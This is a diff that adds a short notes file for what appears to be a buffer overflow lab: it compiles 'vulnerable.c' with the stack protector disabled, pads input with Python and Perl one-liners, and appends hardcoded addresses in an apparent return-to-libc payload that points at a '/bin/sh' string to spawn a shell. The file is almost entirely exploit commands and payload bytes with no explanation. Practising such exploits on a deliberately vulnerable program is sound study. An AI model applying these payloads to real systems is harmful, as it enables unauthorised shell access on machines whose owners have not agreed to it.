@@ -1,0 +1,12 @@
+run $(python -c "print('A'*21)")
+
+
+./abhishek `perl -e 'print"A"x21 ."\x30\xf4\xe5\xb7\xb0\x2f\xe5\xb7\x82\xfe\xff\xbf";'`
+
+
+gcc -o abhishek -fno-stack-protector vulnerable.c
+
+
+0xbffffe86:	 "/bin/sh"
+
+
